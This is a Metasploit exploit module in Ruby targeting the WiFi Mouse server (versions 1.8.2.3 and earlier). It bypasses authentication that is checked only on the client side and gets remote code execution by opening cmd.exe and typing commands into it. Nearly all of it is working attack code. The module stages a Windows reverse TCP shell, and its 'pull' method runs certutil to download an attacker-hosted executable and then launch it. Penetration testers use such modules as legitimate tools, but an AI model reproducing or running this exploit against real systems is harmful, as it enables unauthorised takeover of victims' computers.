##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Wifi Mouse RCE',
        'Description' => %q{
          The WiFi Mouse (Mouse Server) from Necta LLC contains an auth bypass as the
          authentication is completely implemented client side.  Then it is possible
          to open a program on the server (cmd.exe in our case) and type commands
          resulting in an RCE.  While commands are being typed, any user interaction
          will most likely break the payload staging process.
          Versions 1.8.2.3 and before are vulnerable.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # msf module
          'REDHATAUGUST', # edb
          'H4RK3NZ0' # edb
        ],
        'References' => [
          [ 'EDB', '50972' ],
          [ 'EDB', '49601' ],
          [ 'URL', 'http://wifimouse.necta.us/' ],
          [ 'URL', 'https://github.com/H4rk3nz0/PenTesting/blob/main/Exploits/wifi%20mouse/wifi-mouse-server-rce.py' ]
        ],
        'Arch' => [ ARCH_X64, ARCH_X86 ],
        'Platform' => 'win',
        'Targets' => [
          [
            'stager',
            {
              'CmdStagerFlavor' => [ 'certutil', 'vbs' ]
            }
          ],
          ['pull', {}],
        ],
        'Payload' => {
          'BadChars' => "\x0a\x00"
        },
        'DefaultOptions' => {
          # since this may get typed out ON SCREEN we want as small a payload as possible
          'PAYLOAD' => 'windows/shell/reverse_tcp'
        },
        'DisclosureDate' => '2021-02-25',
        'DefaultTarget' => 1,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [CRASH_SERVICE_DOWN],
          'SideEffects' => [SCREEN_EFFECTS, ARTIFACTS_ON_DISK] # typing on screen
        }
      )
    )
    register_options(
      [
        OptPort.new('RPORT', [true, 'Port WiFi Mouse runs on', 1978]),
        OptInt.new('SLEEP', [true, 'How long to sleep between commands', 1]),
        OptInt.new('LINEMAX', [true, 'Maximum length of lines to send for stager method.  Smaller for more unstable connections.', 1_020]),
        OptString.new('PATH', [true, 'where to stage payload for pull method.', 'c:\\Windows\\Temp\\'])
      ]
    )
  end

  def send_return
    sock.put('key  3RTN') # what the mobile app sends
  end

  def send_command(command)
    sock.put("utf8 #{command}\x0A")
    sleep(datastore['SLEEP'])
    send_return
  end

  def open_file(file)
    file = "/#{file}".gsub('\\', '/').gsub(':', '')
    sock.put("openfile #{file}\x0A")
  end

  def on_request_uri(cli, _req)
    p = generate_payload_exe
    send_response(cli, p)
    print_good("Payload request received, sending #{p.length} bytes of payload for staging")
  end

  def exploit
    connect
    print_status('Opening command prompt')
    open_file('C:\\Windows\\System32\\cmd.exe')
    sleep(datastore['SLEEP']) # give time for it to open
    print_status('Typing out payload')
    if target.name == 'stager'
      execute_cmdstager({ linemax: datastore['LINEMAX'], delay: datastore['SLEEP'] })
    elsif target.name == 'pull'
      # this method was in the original edb exploit, this is significantly faster
      # and speed is of the essence since remote user input most likely breaks this module
      start_service('Path' => '/') # start webserver

      filename = Rex::Text.rand_text_alphanumeric(rand(8..17)) + '.exe'
      send_command("certutil.exe -urlcache -f http://#{datastore['lhost']}:#{datastore['SRVPORT']}/ #{datastore['path']}#{filename} && exit")
      path_to_execute = "#{datastore['path']}#{filename}"
      sleep(datastore['SLEEP'] * 2) # give time for it to save

      # now that our payload is on host, just open it directly
      print_status('Attempting to open payload')
      open_file(path_to_execute)
    end
    handler
  end

  def execute_command(cmd, _opts = {})
    send_command(cmd)
  end
end
